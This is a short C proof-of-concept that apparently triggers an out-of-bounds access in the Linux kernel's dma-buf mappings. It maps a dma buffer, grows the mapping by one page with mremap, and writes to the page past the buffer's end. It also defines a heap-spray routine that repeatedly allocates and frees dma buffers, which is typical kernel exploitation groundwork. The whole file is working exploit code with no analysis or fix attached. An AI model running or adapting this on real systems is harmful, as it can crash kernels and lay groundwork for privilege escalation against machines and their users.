#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <sys/io.h>
#include <sys/mman.h>
#include <unistd.h>

#include "dma_buf_t.h"

#define N_PAGES 7
#define PAGE_SIZE 0x1000
#define errx(ret_code, msg) do{perror(msg); exit(ret_code);} while(0);

#define NUM_SPRAYS (10)
#define NUM_SPRAY_BUFFERS (64)

dma_buf_t *spray_buffers[NUM_SPRAY_BUFFERS] = {0};

void spray()
{
    for (int i=0; i<NUM_SPRAYS; i++) {
        for (int j=0; j<NUM_SPRAY_BUFFERS; j++) {
            spray_buffers[j] = dma_buf_create(N_PAGES*PAGE_SIZE+PAGE_SIZE);
        }

        for (int j=0; j<NUM_SPRAY_BUFFERS; j++) {
            close(spray_buffers[j]->buf_fd);
        }
    }
}

int main(int argc, char* argv[])
{
    printf("[+] creating dma buf\n");
    dma_buf_t *dma_buf = dma_buf_create(N_PAGES*PAGE_SIZE);
    if(!dma_buf)
        errx(1, "[-] couldn't create dma buf");
    
    printf("[+] mapping dma buf\n");
    void* addr = mmap(NULL, dma_buf->size,
        PROT_READ|PROT_WRITE, MAP_SHARED, dma_buf->buf_fd, 0);
    if (addr == MAP_FAILED)
        errx(1, "[-] couldn't map memory");

    printf("[+] expanding dma buf by one page\n");
    void* remapped_addr = mremap(addr, dma_buf->size, dma_buf->size+PAGE_SIZE, MREMAP_MAYMOVE);
    if(remapped_addr==MAP_FAILED)
        errx(1, "[-] couldn't mremap memory");

    printf("[+] accessing OOB page\n");
    *((char*)remapped_addr+dma_buf->size) = 0;
}